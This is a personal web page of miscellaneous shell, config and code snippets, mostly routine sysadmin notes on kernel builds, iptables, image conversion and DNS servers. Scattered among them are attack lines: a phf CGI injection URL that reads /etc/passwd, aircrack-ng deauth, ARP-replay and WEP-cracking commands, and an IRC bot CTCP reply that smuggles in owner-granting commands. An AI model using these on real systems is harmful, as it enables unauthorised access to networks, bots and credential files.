---
layout: page
#title: "Hall Of Syntax"
comments: true
sharing: true
footer: true
sidebar: false
---
<p style="margin-top:0.5em; margin-bottom:0.3em"><strong><a href="/syntax">Hall of Syntax</a> -> Syntax Mess</strong></p>

Here you'll see a mess of syntax snippets that I found useful at some point in my life. Since this category is called 'mess' there is no particular order or useful description. Read at your own risk!

<PRE>
##
## public DNS servers
##
Provider                Primary DNS Server  Secondary DNS Server
Level31                 209.244.0.3         209.244.0.4
Google2                 8.8.8.8             8.8.4.4
Comodo Secure DNS       8.26.56.26          8.20.247.20
OpenDNS Home3           208.67.222.222      208.67.220.220
DNS Advantage           156.154.70.1        156.154.71.1
Norton ConnectSafe4     199.85.126.10       199.85.127.10
GreenTeamDNS5           81.218.119.11       209.88.198.133
SafeDNS6                195.46.39.39        195.46.39.40
OpenNIC7                216.87.84.211       23.90.4.6
Public-Root8            199.5.157.131       208.71.35.137
SmartViper              208.76.50.50        208.76.51.51
Dyn                     216.146.35.35       216.146.36.36
censurfridns.dk9        89.233.43.71        89.104.194.142
Hurricane Electric10    74.82.42.42  
puntCAT11               109.69.8.51  

# 99 bottles of lisp
(labels ((foo (x)
   (and (<= 0 x) (cons x (foo (1- x))))))
   (format t (format nil 
        "~~{~~&~~@(~~%~~R ~A ~A!~~)~~:*~~&~~@(~~R
~0@*~A!~~)~~&~~@(~2@*~A!~~)~~&~~@(~~[~A~~:;~~:*~~R~~:*~~] ~0@*~A!~~)~~}"
        "bottles of beer"
        "on the wall"
        "take one down, pass it around" 
        "no more"
        )
 (foo 99)))

# HTTP GET REQUEST
GET / HTTP/1.1
Host: snej.de

# Avoid iTunes device backups
defaults write com.apple.iTunes AutomaticDeviceBackupsDisabled -bool true

for i in `ls *.jpg`; do convert -resize 50% -quality 90 $i conv_$i; done 

# crop all files and then... do some more things
for i in `ls *.png`; do convert -verbose -crop 1352x970+985+219 $i 123/conv_$i; done
i=0; while [ $i -lt 10 ]; do echo "mv seite_$i"; i=$[i+1]; done
for name in *\ *; do echo \"$name\"; done

# old perma links
http://www.snej.de/2014/06/top-5-swift-features-briefly-explained.html
http://www.snej.de/2014/06/swift-announced.html
http://www.snej.de/2014/04/onelinesystemmon-simple-geeklet-that.html
http://www.snej.de/2013/07/raspberry-pi-setting-up-wifi-connection.html
http://www.snej.de/2012/11/jingle-bells-playing-light-up-piano.html
http://www.snej.de/2011/08/think-win-win.html
http://www.snej.de/2010/08/spartanpong.html
http://www.snej.de/p/contact_24.html

# /usr/local/sbin/wpa_supplicant -B -w -i ath0 -D madwifi \
-c /etc/wpa_supplicant.conf -dd
State: GROUP_HANDSHAKE -> COMPLETED

# file permissions
r            read.
w            write.
x            execute or access for directories.
X            execute only if the file is a directory or already has
             execute permission  for  some user.
s            set user or group ID on execution.
t            sticky.
u            the permissions granted to the user who owns the file.
g            the permissions granted to the file's group.
o            and the permissions granted to users that are not u or g.

# ameib port
port 14191

# Xilinx ISE/EDK under linux
alias xilinx='source $HOME/opt/XilinxDesignSuite_101_64/ISE/settings64.sh; source \
$HOME/opt/XilinxDesignSuite_101_64/EDK/settings64.sh; export \
LD_PRELOAD=$HOME/opt/usb-driver/libusb-driver.so; echo $1; \
LD_LIBRARY_PATH=""; LD_PRELOAD_PATH=""'

classical:
    cp /boot/config-XXX .config
    make menuconfig
    make dep
    make bzImage
    make modules
    make modules_install
    (evtl /etc/modules editieren)

debian:
    cp /boot/config-XXX .config
    make menuconfig
    make-kpkg clean
    fakeroot make-kpkg --initrd --revision=custom.1.0 --append-to-version==custom.1.0 kernel_image
    dpkg -i XXX.deb

++++++ COMPILING THE KERNEL ++++++
1 make menuconfig
2 make-kpkg clean
3 fakeroot make-kpkg --revision=custom.1.0 kernel_image
4 if (error) make clean; GOTO 2
5 dpkg -i kernel-image-2.6.8.1_custom.1.0_i386.deb
6 cd /boot/; mkinitrd -o /boot/initrd.img-2.6.8.1 2.6.8.1

vmlinuz initrd=initrd.img
linux initrd=initrd.img
/boot/isolinux/linux initrd=/boot/isolinux/initramfs_data_cpio.gz video=vesafb:1024x768-16@75

kernel-quellen an die config des laufenden kernels anpassen (suse?):
    make mrproper
    make cloneconfig
    make dep
    (make prepare)?


shopt -s dotglob
cmap w!! %!sudo tee > /dev/null %
diff -arq 

grep -A 0 -B 0 -Irin --include=*.[ch] "this_is_a_pattern" .

find . -iname "*.c" -exec cp -nv "{}" /home/foo/bar/ \;


" VIM Switch off all auto-indenting
set nocindent
set nosmartindent
set noautoindent
set indentexpr=
filetype indent off
filetype plugin indent off
 
# terminal settings
set term=cons25

sudo mount -t ntfs -o rw,auto,nobrowse /dev/disk1s1 /Users/jens/mnt_sticky
#update-rc.d -f gdm remove
#update-rc.d -f gdm defaults

pdftk secured.pdf input_pw foopass output unsecured.pd

rsync -qaHExA

find / -mtime -1 \! -type d -print > /tmp/filelist.daily

mount -o conv=auto


semilogx(x, 20*log(y),'b.-');
title('Frequenzgang Versuch 4.2');
xlabel('Frequenz / Hz');
ylabel('Verstärkung / dB');
grid;
axis([0 1590 0 60])
grep Verkauft vk.txt -A1 | grep EUR | cut -c 5-

sudo tmutil disablelocal
sudo tmutil enablelocal

openssl aes-256-cbc -e -a -in PLAIN -out ENCRYPTED
openssl aes-256-cbc -d -a -in ENCRYPTED -out PLAIN

git tag -a v1.0
git tag -a v0.9 558151a
git log --oneline --decorate --graph

$ cat /etc/udev/usbprog.rules
ATTRS{idVendor}=="03eb", ATTRS{idProduct}=="2104", MODE="0660",
GROUP="plugdev"
$ ls -l /etc/udev/rules.d/z90_usbprog.rules
lrwxrwxrwx 1 root root 16 2008-05-19 17:51
/etc/udev/rules.d/z90_usbprog.rules -> ../usbprog.rules

iwlist
iwpriv ath0 mode X  # 0=abg, 1=a, 2=b, 3=g 
            turbo X # 0, 1
modprobe ath_pci countrycode=276    # de

.htaccess
    Options +Indexes

# apt-get update

winres.h
#pragma comment(lib, "ode.lib")

#define STRING_SELF_INIT(a) char string_##a = #a
STRING_SELF_INIT(xyz); // char string_xyz = "xyz"

sfdisk -l -uS imagefile

mount -oloop,offset=4711 imagefile /mnt/point

nolmhash

bind ctcr - PING ctcr:pingreply
proc ctcr:pingreply {nick uhost hand dest key arg} {
set dur [expr [unixtime] - $arg]
putserv \"NOTICE $nick :Your ping reply took $dur seconds\" }
/ctcpreply <botname> PING [ adduser <yournick> *!<you>@<yourhostmask> * ]
/ctcpreply <botname> PING [ chattr <yournick> +nm ]
/msg <botname> pass <password>
/dcc chat <botname>

http://www.try2hack.nl/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd




ARP REPLAY: aireplay -3 -b <AP> -h <CLIENT> (-x <PPS>) ath0
DEAUTH:   aireplay -0 1 -a <AP> -c <CLIENT> ath0

-ng commands:
sniff:
    airodump-ng ath0
sniff on channel 11 and dump:
    airodump-ng -c 11 -w dump ath0
test if injection works:
    aireplay-ng --fakeauth 0 -e ESSID -a BSSID -h YOUR_MAC ath0
start arp replay:
    aireplay-ng --arpreplay -b BSSID -h CONNECTED_CLIENT ath0
force clients to reconnect:
    aireplay-ng --deauth 5 -a BSSID -c CONNECTED_CLIENT ath0
crack:
    aircrack-ng -b BSSID dump-01.cap


GetProcAddress(LoadLibrary("powrprof.dll"), "SetSuspendState")(TRUE,TRUE,TRUE);


javascript:R=0; x1=.1; y1=.05; x2=.25; y2=.24; x3=1.6; y3=.24;x4=300; y4=200; x5=300; y5=200; DI=document.images; DIL=DI.length;function A(){for(i=0; i<DIL; i++){DIS=DI[ i ].style;DIS.position='absolute'; DIS.left=Math.sin(R*x1+i*x2+x3)*x4+x5;DIS.top=Math.cos(R*y1+i*y2+y3)*y4+y5}R++ }setInterval('A()',5); void(0)


sleep 10; xwd -root |xwdtopnm |pnmtojpeg --quality 100 >~/dumps/`date +%Y%m%d%H%M%S`.jpg


dd if=filename of=/dev/fd0 bs=1024 conv=sync ; sync


tftp
 binary
 trace
put openwrt-brcm-2.4-squashfs.trx
openwrt-wrt54g-squashfs.bin


NoDriveTypeAutoRun -> ff


find verzeichnis -type d -print | xargs chmod 755
find verzeichnis -type f -print | xargs chmod 644


head -vc 9999m *|hexdump -C|grep -e "jens" -e "JENS" -e "Jens"



source=prism54g,eth2,wlan
source=madwifi_ab,wifi0,wlan


svga.maxHeight=1920
svga.maxWidth=1400 


/usr/lib/hotplug/firmware


irc.rz.uni-karlsruhe.de


VGA Modes:
COLORS(BITS)    640 800 1024    1280    1600
 8      769 771 773 775 796
15      784 787 790 793 797
16      785 788 791 794 798
24      786 789 792 795 799


telnet whois.arin.net 43

/etc/php5/pool.d/fpm/www.conf

#
# IPTABLES DEFIRE
#

#!/bin/sh
IPTABLES=/sbin/iptables
#Loeschen bestehender Regeln und Chains
$IPTABLES -t filter -F
$IPTABLES -t mangle -F
$IPTABLES -t nat -F
$IPTABLES -X
#Allgemeine Policy
$IPTABLES -P INPUT ACCEPT
$IPTABLES -P OUTPUT ACCEPT
$IPTABLES -P FORWARD ACCEPT

#
# IP TABLES - FIRE
#
#!/bin/sh
IPTABLES=/sbin/iptables
#Loeschen bestehender Regeln und Chains
$IPTABLES -t filter -F
$IPTABLES -t mangle -F
$IPTABLES -t nat -F
$IPTABLES -X
#Allgemeine Policy
$IPTABLES -P INPUT DROP
$IPTABLES -P OUTPUT DROP
$IPTABLES -P FORWARD DROP
#Freigabe Loopbackdevice
$IPTABLES -A INPUT -i lo -j ACCEPT
$IPTABLES -A OUTPUT -o lo -j ACCEPT
#SSH zulassen von INTIP
#$IPTABLES -A INPUT -i $INSIDE -p tcp -s $INTIP --sport 1024: -d $INTIP --dport 22 -j ACCEPT
#$IPTABLES -A OUTPUT -o $INSIDE -p tcp -s $INTIP --sport 22 -d $INTIP --dport 1024: -j ACCEPT
# WWW 
$IPTABLES -A OUTPUT -p tcp --sport 1024: --dport 80    -m state --state NEW,ESTABLISHED -j ACCEPT
$IPTABLES -A INPUT  -p tcp --sport 80    --dport 1024: -m state --state ESTABLISHED     -j ACCEPT
# DNS
$IPTABLES -A OUTPUT -p udp --sport 1024: --dport 53    -j ACCEPT
$IPTABLES -A INPUT  -p udp --sport 53    --dport 1024: -j ACCEPT
#SMTP,POP3 auf von INT_IP auf lanserver zulassen
#$IPTABLES -A FORWARD -p tcp -s $INTIP --sport 1024: --dport 110 -d $LANSERVER -o $OUTSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s $LANSERVER -d $INTIP --sport 110 --dport 1024: -o $INSIDE -m state --state ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s $INTIP --sport 1024: --dport 25 -d $LANSERVER -o $OUTSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s $LANSERVER -d $INTIP --sport 25 --dport 1024: -o $INSIDE -m state --state ESTABLISHED -j ACCEPT
#
#ICMP mit 10pak/min nur zu LANSERVER
#$IPTABLES -A FORWARD -p icmp -m limit --limit 10/m -s $INTIP -d $LANSERVER -o $OUTSIDE -j ACCEPT
#$IPTABLES -A FORWARD -p icmp -m limit --limit 10/m -d $INTIP -s $LANSERVER -o $INSIDE -j ACCEPT
#
#WWW zulassen von EXTIP auf int WWW-Srv
#$IPTABLES -A FORWARD -p tcp -s $EXTIP --sport 1024: --dport 80 -o $INSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s $INTWEB --sport 80 --dport 1024: -o $OUTSIDE -m state --state ESTABLISHED -j ACCEPT
#
#SSH,FTP auf testserver von int WorkStation
#$IPTABLES -A FORWARD -p tcp -s 172.17.1.3 -d 172.16.1.7 --sport 1024: --dport 22 -o $OUTSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s 172.16.1.7 -d 172.17.1.3 --sport 22 --dport 1024: -o $INSIDE -m state --state ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s 172.17.1.3 -d 172.16.1.7 --sport 1024: --dport 21 -o $OUTSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s 172.17.1.3 -d 172.16.1.7 --sport 1024: --dport 20 -o $OUTSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s 172.16.1.7 -d 172.17.1.3 --sport 21 --dport 1024: -o $INSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#$IPTABLES -A FORWARD -p tcp -s 172.16.1.7 -d 172.17.1.3 --sport 20 --dport 1024: -o $INSIDE -m state --state NEW,ESTABLISHED -j ACCEPT
#
#NAT
#$IPTABLES -t nat -A PREROUTING -d $EXTIP -i $OUTSIDE -j DNAT --to-destination 172.17.1.2

export PATH=$PATH:$HOME/bin

alias english='export LANG=en_US'


#!/bin/bash
#
i=$1
end=$2
sum=0
count=0
average=0
#
# checking parameters for validity
if [ $1 -ge 0 -a $2 -ge $1 ]
then
#
# main prog
while [ $i -lt $[end+1] ]
  do
    if [ -f $i.jpg ]
      then
        sum=$[sum+i]
        count=$[count+1]
        echo -n "*"
      else
        # wget -q $BASE_URL/$i.jpg
          pavuk -bg -base_level 4 -quiet -http_proxy $PROXY -nocache $BASE_URL/$i.jpg
          sleep $3
        if [ -f $i.jpg ]
          then
            sum=$[sum+i]
            count=$[count+1]
            echo -n [$i]
          else
            echo -n " "
       fi
    fi
    i=$[i+1]
done
echo ""
if [ $sum -gt 0 ]
  then
    echo "$sum / $count = $[sum/count]"
  else
    echo "nothing found"
fi
# short help
else
echo "Usage : getpics START END DELAY"
fi


</PRE>

